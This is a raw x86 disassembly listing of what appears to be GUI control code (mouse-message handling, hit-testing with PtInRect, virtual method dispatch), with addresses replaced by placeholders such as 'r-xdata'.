mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x188 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x44 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x18c ]
jne r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x188 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x61 ]
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
jne r-xdata
sub_43daa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0x8 ]
mov eax [ ebx ]
push eax
push r-xdata
mov eax [ ebx ]
push eax
push sub_43d848
push ebp
call sub_43d854
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_43ed78
mov eax [ ebx ]
push eax
push sub_43ed10
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
xor ecx ecx
jmp r-xdata
push ebp
xor eax eax
call sub_43d888
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_43ed48
mov eax [ ebx ]
push eax
push sub_43ecf0
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x1
call sub_43d888
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_43ed20
mov eax [ ebx ]
push eax
push sub_43ed38
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x2
call sub_43d888
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebx ]
push eax
push sub_43ed60
mov eax [ ebx ]
push eax
push sub_43ed00
mov eax [ ebx ]
test [ eax + 0x1c ] 0x2
jne r-xdata
mov cl 0x1
xor ecx ecx
jmp r-xdata
push ebp
mov al 0x3
call sub_43d888
pop ecx
test al al
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov cl 0x1
sub_43dc47
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x110 ]
je r-xdata
cmp [ ebx + 0x112 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
pop ebx
retn
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
sub_43dcc4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xc2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43dcfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43d2cc
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_404160
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd4
call sub_404160
sub_43dd80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43bca4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43c380
movzx eax [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43dcfc
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43ddcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43bca4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43dde8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43bca4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43c380
movzx eax [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43dcfc
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_404160
sub_43de44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_43d26c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43d200
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43d26c
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43dee0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43dcfc
pop esi
pop ebx
retn
sub_43df09
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43dcfc
pop esi
pop ebx
retn
sub_43df31
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43dcfc
pop esi
pop ebx
retn
sub_43df61
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43dcfc
pop esi
pop ebx
retn
sub_43df89
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
movzx ecx [ ebp - 0x1 ]
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43dfc4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_43d2cc
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd3
call sub_404160
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd3
call sub_404160
sub_43e03c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43e074
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd2
call sub_404160
sub_43e0ac
push ebx
push esi
push edi
add esp 0xffffffe4
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_43c380
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43e074
add esp 0x1c
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov eax [ edi + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
push [ esp + 0x8 ]
push [ esp + 0x8 ]
lea edx [ esp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x14 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_404160
sub_43e130
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43e074
pop esi
pop ebx
retn
sub_43e150
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43e074
pop esi
pop ebx
retn
sub_43e170
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0x4 ]
call sub_44e5e0
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_404160
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_448da0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43e1c8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43c370
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_43c380
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43d400
pop esi
retn
sub_43e208
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_43d434
sub_43e2b6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_43c59c
mov cl 0x1
sub_43e310
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_43c2e8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43c2e8
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43e340
push esi
push edi
mov esi eax
cmp [ esi + 0x60 ] 0x0
je r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
mov [ esi + 0x60 ] 0x1
movzx edx [ edi + 0x5f ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_43e364
push ebx
push esi
push edi
add esp 0xfffffff4
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
movsx eax [ esp ]
mov [ esp + 0x4 ] eax
movsx eax [ esp + 0x2 ]
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x4 ]
push eax
movsx ecx [ ebx + 0x6 ]
movzx edx [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_404160
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43d400
mov [ ebx + 0xc ] eax
sub_43e3f4
push ebx
mov ebx eax
cmp [ ebx + 0x8e ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
mov edx [ ebx + 0x30 ]
test [ edx + 0x1c ] 0x10
setne dl
cmp al dl
jne r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x8d ]
mov eax ebx
call sub_43c298
mov [ ebx + 0x8e ] 0x1
sub_43e430
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43c23c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43c23c
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43e48c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb013
call sub_43d400
pop esi
pop ebx
retn
cmp [ ebx + 0x13a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_43e4c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx 0xb014
call sub_43d400
pop esi
pop ebx
retn
cmp [ ebx + 0x132 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_43e50c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_403e3c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_43b7fc
mov edx [ esp ]
mov eax esi
call sub_43b7c8
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43bacc
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_43bb10
sub_43e590
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_415348
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_43bbc8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x4c ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_415398
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ba78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e61c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
call sub_43e50c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax ebx
call sub_443be8
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_43e590
pop ecx
jmp r-xdata
sub_43e67c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43e76c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e773
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_43c178
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43c148
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43c148
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_405270
jne r-xdata
lea eax [ esi + 0x84 ]
mov edx [ edi + 0x7c ]
call sub_404e98
cmp [ esi + 0x84 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_43c068
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x110 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x114 ] eax
cmp [ esi + 0x112 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43e77c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_404160
sub_43e7a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43e7c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43e7e8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43e808
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43e828
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43e848
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41dec4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_43b644
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_404160
sub_43e880
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e91d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_44bd80
mov edx [ ebx + 0x84 ]
mov eax edi
call sub_44bebc
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c148
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44bc18
movzx edx [ ebx + 0x57 ]
mov eax edi
call sub_44bfdc
push [ ebx + 0x114 ]
push [ ebx + 0x110 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e924
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_43e92c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fwait
fnstsw ax
sahf
jae r-xdata
sub_43e968
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
